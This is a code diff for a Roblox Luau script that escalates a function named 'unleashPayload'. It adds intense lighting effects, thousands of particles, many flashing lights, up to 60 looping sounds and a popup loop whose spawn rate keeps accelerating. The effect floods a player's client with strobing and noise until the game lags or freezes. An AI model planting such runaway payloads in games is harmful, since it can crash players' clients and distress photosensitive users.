@@ -181,11 +181,51 @@ local function lockDown()
 end
 
 local function unleashPayload()
+	pcall(function()
+		local L = game:GetService("Lighting")
+		L.Technology = Enum.Technology.Future
+		L.GlobalShadows = true
+		L.EnvironmentDiffuseScale = 1
+		L.EnvironmentSpecularScale = 1
+		L.Ambient = Color3.fromRGB(0, 0, 0)
+		L.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
+		L.ClockTime = 0
+		L.FogEnd = 100
+		L.FogStart = 0
+		L.FogColor = Color3.fromRGB(255, 255, 255)
+
+		for _, effectClass in ipairs({ "BloomEffect", "SunRaysEffect", "BlurEffect", "DepthOfFieldEffect", "ColorCorrectionEffect" }) do
+			pcall(function()
+				local fx = Instance.new(effectClass)
+				if effectClass == "BloomEffect" then
+					fx.Intensity = 8
+					fx.Size = 56
+					fx.Threshold = 0
+				elseif effectClass == "SunRaysEffect" then
+					fx.Intensity = 1
+					fx.Spread = 1
+				elseif effectClass == "BlurEffect" then
+					fx.Size = 24
+				elseif effectClass == "DepthOfFieldEffect" then
+					fx.FocusDistance = 0.05
+					fx.InFocusRadius = 0.1
+					fx.NearIntensity = 1
+					fx.FarIntensity = 1
+				elseif effectClass == "ColorCorrectionEffect" then
+					fx.Saturation = 3
+					fx.Contrast = 2
+				end
+				fx.Parent = L
+			end)
+		end
+	end)
+
 	task.spawn(function()
-		for tick = 1, 9 do
-			task.wait(1)
-			local emitterCount = tick * 8
-			local lightCount = tick * 4
+		for tick = 1, 30 do
+			task.wait(0.25)
+			local emitterCount   = 40 + tick * 10
+			local lightCount     = 25 + tick * 5
+			local highlightCount = 15 + tick * 3
 			local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
 			local basePos = root and root.Position or Vector3.new(0, 5, 0)
 
@@ -197,20 +237,36 @@ local function unleashPayload()
 					part.CanCollide = false
 					part.Anchored = true
 					part.CFrame = CFrame.new(basePos + Vector3.new(
-						math.random(-30, 30),
-						math.random(-5, 20),
-						math.random(-30, 30)
+						math.random(-60, 60),
+						math.random(-10, 40),
+						math.random(-60, 60)
 					))
 
 					local emitter = Instance.new("ParticleEmitter")
-					emitter.Rate = 400
-					emitter.Lifetime = NumberRange.new(8, 15)
-					emitter.Size = NumberSequence.new(12)
+					emitter.Rate = 2500
+					emitter.Lifetime = NumberRange.new(10, 20)
+					emitter.Size = NumberSequence.new(30)
 					emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
 					emitter.LightEmission = 1
 					emitter.LightInfluence = 0
-					emitter.Transparency = NumberSequence.new(0.3)
+					emitter.Transparency = NumberSequence.new(0.2)
 					emitter.Parent = part
+
+					local emitter2 = Instance.new("ParticleEmitter")
+					emitter2.Rate = 1500
+					emitter2.Lifetime = NumberRange.new(8, 16)
+					emitter2.Size = NumberSequence.new(24)
+					emitter2.Texture = "rbxasset://textures/particles/fire_main.dds"
+					emitter2.LightEmission = 1
+					emitter2.LightInfluence = 0
+					emitter2.Transparency = NumberSequence.new(0.3)
+					emitter2.Parent = part
+
+					local sparkles = Instance.new("Sparkles")
+					sparkles.SparkleColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+					sparkles.Enabled = true
+					sparkles.Parent = part
+
 					part.Parent = workspace
 				end)
 			end
@@ -218,20 +274,69 @@ local function unleashPayload()
 			for _ = 1, lightCount do
 				pcall(function()
 					local part = Instance.new("Part")
-					part.Size = Vector3.new(1, 1, 1)
-					part.Transparency = 1
+					part.Size = Vector3.new(3, 3, 3)
+					part.Transparency = 0.6
+					part.Material = Enum.Material.Neon
+					part.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
 					part.CanCollide = false
 					part.Anchored = true
 					part.CFrame = CFrame.new(basePos + Vector3.new(
-						math.random(-40, 40),
-						math.random(0, 25),
-						math.random(-40, 40)
+						math.random(-80, 80),
+						math.random(0, 60),
+						math.random(-80, 80)
 					))
+
 					local light = Instance.new("PointLight")
-					light.Range = 60
-					light.Brightness = 8
+					light.Range = 100
+					light.Brightness = 15
 					light.Shadows = true
+					light.Color = Color3.fromRGB(math.random(80, 255), math.random(80, 255), math.random(80, 255))
 					light.Parent = part
+
+					local spot = Instance.new("SpotLight")
+					spot.Range = 80
+					spot.Brightness = 12
+					spot.Angle = 120
+					spot.Shadows = true
+					spot.Face = Enum.NormalId.Top
+					spot.Color = Color3.fromRGB(math.random(80, 255), math.random(80, 255), math.random(80, 255))
+					spot.Parent = part
+
+					local surface = Instance.new("SurfaceLight")
+					surface.Range = 60
+					surface.Brightness = 10
+					surface.Angle = 180
+					surface.Shadows = true
+					surface.Face = Enum.NormalId.Front
+					surface.Parent = part
+
+					part.Parent = workspace
+				end)
+			end
+
+			for _ = 1, highlightCount do
+				pcall(function()
+					local part = Instance.new("Part")
+					part.Size = Vector3.new(6, 6, 6)
+					part.Transparency = 0.7
+					part.Material = Enum.Material.ForceField
+					part.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+					part.CanCollide = false
+					part.Anchored = true
+					part.CFrame = CFrame.new(basePos + Vector3.new(
+						math.random(-50, 50),
+						math.random(0, 40),
+						math.random(-50, 50)
+					))
+
+					local hl = Instance.new("Highlight")
+					hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+					hl.OutlineColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+					hl.FillColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+					hl.OutlineTransparency = 0
+					hl.FillTransparency = 0.3
+					hl.Parent = part
+
 					part.Parent = workspace
 				end)
 			end
@@ -266,7 +371,7 @@ local function unleashPayload()
 	blackFrame.Parent = blackGui
 
 	local SOUND_ID = "rbxassetid://131761138083978"
-	local MAX_SOUNDS = 25
+	local MAX_SOUNDS = 60
 	local sounds = {}
 
 	local function addSound(clean)
@@ -498,16 +603,17 @@ local function unleashPayload()
 	end
 
 	spawnPopup()
-	for i = 1, 8 do
-		task.delay(i * 0.1, spawnPopup)
+	for i = 1, 20 do
+		task.delay(i * 0.05, spawnPopup)
 	end
 
 	task.spawn(function()
-		local interval = 0.25
+		local interval = 0.15
 		while true do
 			task.wait(interval)
 			spawnPopup()
-			interval = math.max(0.02, interval * 0.94)
+			spawnPopup()
+			interval = math.max(0.01, interval * 0.92)
 		end
 	end)
 end
